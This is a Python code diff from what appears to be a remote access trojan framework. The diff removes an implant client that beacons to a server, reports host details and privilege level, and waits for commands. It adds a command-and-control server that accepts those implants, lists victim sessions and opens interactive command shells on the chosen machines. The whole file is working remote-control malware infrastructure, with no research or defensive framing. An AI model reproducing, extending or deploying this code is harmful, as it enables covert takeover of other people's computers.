@@ -1,146 +1,386 @@
+import json
 import os
-import platform
 import socket
+import subprocess
 import sys
+import threading
 import time
-import uuid
 
-from client.config.config import SERVER_ADDR
-from core.utils.client_util import check_privilege
-from client.connection.server_connection import ServerConnection
+from core.protocol.ratsocket import RATSocket
 from core.utils.logger import logger
+from core.utils.parsing import parse
+from core.utils.formatting import print_table
+from core.utils.terminal import Colors
+from server.commands.alias_manager import AliasManager
+from server.commands.executor import CommandExecutor
+from server.config.config import SOCKET_ADDR
+from core.utils.server_util import *
+from server.connection.client_connection import ClientConnection
+from server.connection.connection_manager import ConnectionManager
+from server.web.service import ServerWebService
 
 
-class Client:
-    RECONNECT_INTERVAL = 5
-
+class Server:
     def __init__(self, address):
+        """
+        初始化服务器对象
+        :param address: 服务器地址
+        """
         self.address = address
-        self.client_id = str(uuid.uuid4())
-        self.server = None
-        self._create_connection()
+        self.socket = RATSocket()
+        self.connections = ConnectionManager()
+        self.alias_manager = AliasManager()
 
+        # web
+        self.web_service = ServerWebService(self)
 
+    # ------------------ connection lookup ------------------ #
+    def get_target_connection_by_client_id(self, client_id) -> ClientConnection:
+        try:
+            return self.connections.get_by_client_id(client_id)
+        except Exception:
+            raise Exception('Not a valid selection')
 
-    def _create_connection(self):
+    def kill_connection_by_client_id(self, client_id):
+        conn = self.get_target_connection_by_client_id(client_id)
+        conn.send_command('kill')
+
+    # ------------------ 连接建立 ------------------ #
+    def _bind_server_socket(self):
         """
-        创建一个新的服务端连接对象
+        绑定并启动监听
         """
-        self.server = ServerConnection()
-        self.server.client_id = self.client_id
+        self.socket.bind(self.address)
+        logger.info('Listening on port {}'.format(self.address[1]))
 
-    def _close_current_connection(self):
+    def _receive_client_info(self, conn):
         """
-        关闭当前连接
+        接收客户端初始信息
+        """
+        conn.settimeout(5)
+        try:
+            connection = ClientConnection(conn)
+            return connection.recv()
+        finally:
+            conn.settimeout(None)
+
+    def _build_connection_info(self, addr, info: dict) -> dict:
+        """
+        构造客户端连接信息
+        """
+        return {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}
+
+    # def _register_connection(self, conn, addr, info: dict) -> ClientConnection:
+    #     """
+    #     创建并注册客户端连接对象
+    #     """
+    #     connection = ClientConnection(conn, addr, info)
+    #     self.connections.add(connection)
+    #     logger.info('Connection has been established: {}'.format(addr))
+    #     return connection
+
+    #web
+    def _register_connection(self, conn, addr, info: dict) -> ClientConnection:
+        # connection = ClientConnection(conn, addr, info)
+
+        connection = self.web_service.create_web_connection(conn, addr, info)
+
+        self.connections.add(connection)
+        logger.info('Connection has been established: {}'.format(addr))
+
+        self.web_service.handle_connection_registered(connection)
+
+        return connection
+    #web end
+
+    def _accept_connection(self):
+        """
+        接受一个新连接并完成初始化
+        """
+        conn, addr = self.socket.accept()
+
+        try:
+            info = self._receive_client_info(conn)
+        except json.JSONDecodeError:
+            conn.close()
+            logger.error('Failed to establish session: invalid client handshake from {}'.format(addr))
+            # logger.error('Connection timed out: {}'.format(addr))
+            return None
+        except Exception as e:
+            conn.close()
+            logger.error('Error establishing connection: {}'.format(e))
+            return None
+
+        info = self._build_connection_info(addr, info)
+        return self._register_connection(conn, addr, info)
+
+    def _start_connection_handler(self, connection):
+        """
+        启动客户端连接接收线程
+        """
+        threading.Thread(
+            target=self.connection_handler,
+            args=(connection,),
+            daemon=True
+        ).start()
+
+    def serve(self):
+        """
+        接受新连接的线程
         """
         try:
-            self.server.close()
-        except Exception:
-            pass
+            self._bind_server_socket()
+        except Exception as e:
+            logger.error('Error binding socket: {}'.format(e))
+            return
 
-    def _reset_connection(self):
-        """
-        关闭当前连接并重建连接对象
-        """
-        self._close_current_connection()
-        self._handle_connection_lost()
-        self._create_connection()
-
-
-    def _build_client_info(self):
-        """
-        构造客户端基础信息
-        """
-        return {
-            'id': self.client_id,
-            'type': 'info',
-            'os_type': platform.system(),
-            'os_ver': platform.platform(),
-            'hostname': socket.gethostname(),
-            'integrity': check_privilege(),
-            'cwd': os.getcwd(),
-        }
-
-    def _connect_socket(self):
-        """
-        建立到底层服务端的连接；失败时持续重试
-        """
-        logger.info(f'Connecting to {self.address}')
-
-        while not self.server.connect(self.address):
-            time.sleep(self.RECONNECT_INTERVAL)
-            print('Attempting to reconnect...')
-            self._create_connection()
-
-    def _handshake(self):
-        """
-        连接建立后发送客户端握手信息
-        """
-        info = self._build_client_info()
-        self.server.send(info)
-        self.server.mark_connected()
-        logger.info('Connected')
-
-    def connect(self):
-        """
-        建立连接并完成握手
-        """
-        self._connect_socket()
-        self._handshake()
-
-    def _recover_from_connection_error(self, error):
-        """
-        连接异常后的恢复逻辑
-        """
-        logger.error(error, exc_info=True)
-        self._reset_connection()
-        self.connect()
-
-    def wait(self):
-        while True:
+        while 1:
             try:
-                result = self.server.recv_command()
-                if result:
-                    self.server.send_result(*result)
-            except SystemExit:
-                logger.info('Server closed this connection')
-                break
+                connection = self._accept_connection()
+                if connection is None:
+                    continue
+                self._start_connection_handler(connection)
             except socket.error as e:
-                self._recover_from_connection_error(e)
-            except Exception as e:
-                self._recover_from_connection_error(e)
+                logger.error(e)
 
-    def _handle_connection_lost(self):
+    # ------------------ 连接生命周期 ------------------ #
+    def _notify_connection_closed(self, conn: ClientConnection):
         """
-        连接断开时的统一清理逻辑：
-        - 先标记连接失效
-        - 停掉所有后台任务
-        - 清掉旧连接运行态
+        通知等待中的主线程：该连接已关闭
+        """
+        conn.message_queue.put(0, None, 1)
+
+    def _remove_connection(self, conn: ClientConnection):
+        """
+        从连接管理器中移除连接
+        """
+        self.connections.remove(conn)
+
+    def _handle_connection_closed(self, conn: ClientConnection):
+        """
+        处理连接关闭后的清理逻辑
+        """
+        logger.error(f'Connection closed: {conn.address}')
+
+        #web
+        self.web_service.handle_connection_closed(conn)
+        #web end
+        self._notify_connection_closed(conn)
+        self._remove_connection(conn)
+
+    def _handle_connection_receive_error(self, conn: ClientConnection):
+        """
+        处理接收线程中的非致命异常
+        """
+        logger.error(f'Error receiving from {conn.address}', exc_info=True)
+        time.sleep(1)
+
+    # ------------------ 子线程接收 ------------------ #
+    def connection_handler(self, conn):
+        """
+        处理接收的子线程
+        :param conn: 连接
+        """
+        while 1:
+            try:
+                conn.recv_message()
+            except socket.error:
+                self._handle_connection_closed(conn)
+                break
+            except Exception:
+                self._handle_connection_receive_error(conn)
+
+    # ------------------ 连接查询 ------------------ #
+    def list_connections(self):
+        """
+        显示连接列表
+        """
+        connection_list = self.connections.all()
+        if not connection_list:
+            # print("No active connections at present")
+            print("No active sessions")
+
+            return
+
+        headers = ['ID', 'Address', 'OS', 'OS Version', 'Hostname', 'Integrity']
+        data = [
+            [
+                str(i),
+                conn.info.get('addr', 'N/A'),
+                conn.info.get('os_type', 'Unknown'),
+                conn.info.get('os_ver', 'Unknown'),
+                conn.info.get('hostname', 'Unknown'),
+                conn.info.get('integrity', '?')
+            ]
+            for i, conn in enumerate(connection_list)
+        ]
+        print_table(headers, data)
+
+    def get_last_connection(self) -> ClientConnection:
+        """
+        获取最新连接
+        :return: 连接
         """
         try:
-            self.server.mark_disconnected()
+            return self.connections.last()
+        except IndexError:
+            raise Exception('No active session available')
+
+            # raise Exception('No connection at this time')
+
+    def get_target_connection(self, id) -> ClientConnection:
+        """
+        根据id获取连接
+        :param id: 连接id
+        :return: 连接
+        """
+        try:
+            return self.connections[int(id)]
+        except (ValueError, IndexError):
+            raise Exception('Not a valid selection')
+
+    def kill_connection(self, id):
+        """
+        关闭连接
+        :param id: 连接id
+        """
+        conn = self.get_target_connection(id)
+        if conn:
+            conn.send_command('kill')
+
+    # ------------------ 交互会话 ------------------ #
+    def _print_unread_messages(self, conn: ClientConnection):
+        """
+        输出连接的未读消息
+        """
+        while not conn.message_queue.empty():
+            logger.info('[UNREAD] ' + str(conn.message_queue.get()[1]))
+
+    def _handle_interactive_control_command(self, conn: ClientConnection, cmd: str) -> bool:
+        """
+        处理交互模式下的控制命令
+        :return: True 表示已处理且应结束当前轮询
+        """
+        if cmd in ['kill', 'reset']:
+            conn.send_command(cmd)
+            return True
+
+        if cmd in ['exit', 'quit']:
+            return True
+
+        if cmd == 'q':
+            connection = self.get_last_connection()
+            if connection == conn:
+                return False
+            self.open_connection(connection)
+            return True
+
+        return False
+
+    def _execute_interactive_command(self, conn: ClientConnection, command_executor: CommandExecutor, cmd: str):
+        """
+        执行交互模式命令
+        """
+        func = command_executor.process_command(cmd)
+        if func:
+            for item in func():
+                write(*item)
+
+    def open_connection(self, conn: ClientConnection):
+        """
+        与连接交互
+        :param conn: 连接
+        """
+        print('[+] Connected to {}'.format(conn.address))
+        conn.is_interactive = True
+        self._print_unread_messages(conn)
+
+        command_executor = CommandExecutor(conn, self)
+        try:
+            while 1:
+                try:
+                    cmd = colored_input('{}> '.format(conn.info['cwd']))
+                    if not cmd.strip():
+                        continue
+
+                    if self._handle_interactive_control_command(conn, cmd):
+                        break
+
+                    self._execute_interactive_command(conn, command_executor, cmd)
+                except Exception as e:
+                    print_error(f'{e.__class__.__name__}: {e}')
+        except socket.error:
+            print_error('[-] Connection closed')
+        except KeyboardInterrupt:
+            print(Colors.RESET)
+            time.sleep(0.1)
+        except Exception as e:
+            print_error(f'{e.__class__.__name__}: {e}')
+        finally:
+            conn.is_interactive = False
+
+    # ------------------ 主控台命令 ------------------ #
+    def _handle_console_command(self, cmd: str):
+        """
+        处理主控台命令
+        """
+        name, arg = parse(cmd)
+
+        if cmd in ['l', 'ls', 'list']:
+            self.list_connections()
+            return
+
+        if cmd == 'q':
+            self.open_connection(self.get_last_connection())
+            return
+
+        if name in ['s', 'select']:
+            self.open_connection(self.get_target_connection(arg))
+            return
+
+        if name in ['k', 'kill']:
+            self.kill_connection(arg)
+            return
+
+        if cmd in ['quit', 'exit']:
+            self.socket.close()
+            sys.exit(0)
+
+        if cmd in ['cls', 'clear']:
+            subprocess.call(cmd, shell=True)
+            return
+
+        if name == 'cd':
+            print(cd(arg))
+            return
+
+        try:
+            self.open_connection(self.get_target_connection(cmd))
         except Exception:
-            pass
+            raise Exception('Command not recognized')
 
-        try:
-            stopped_jobs = self.server.job_manager.handle_connection_lost()
-            if stopped_jobs:
-                logger.info(f'Stopped background jobs after connection loss: {stopped_jobs}')
-        except Exception as e:
-            logger.error(f'Failed to stop background jobs after connection loss: {e}', exc_info=True)
-
-        try:
-            self.server.reset_runtime_state()
-        except Exception as e:
-            logger.error(f'Failed to reset runtime state after connection loss: {e}', exc_info=True)
+    def cmdloop(self):
+        """
+        命令行交互
+        """
+        while 1:
+            try:
+                cmd = colored_input('flc> ')
+                if not cmd.strip():
+                    continue
+                self._handle_console_command(cmd)
+            except KeyboardInterrupt:
+                print(Colors.RESET)
+                self.socket.close()
+                sys.exit(0)
+            except Exception as e:
+                write(0, f'[-] {type(e).__name__}: {e}')
+            finally:
+                print()
 
 
 if __name__ == '__main__':
-    client = Client(SERVER_ADDR)
-    try:
-        client.connect()
-        client.wait()
-    except KeyboardInterrupt:
-        sys.exit(0)
-    except Exception as e:
-        logger.error(e, exc_info=True)
+    os.system('')  # 初始化颜色显示
+    server = Server(SOCKET_ADDR)
+    threading.Thread(target=server.serve, daemon=True).start()
+    server.cmdloop()
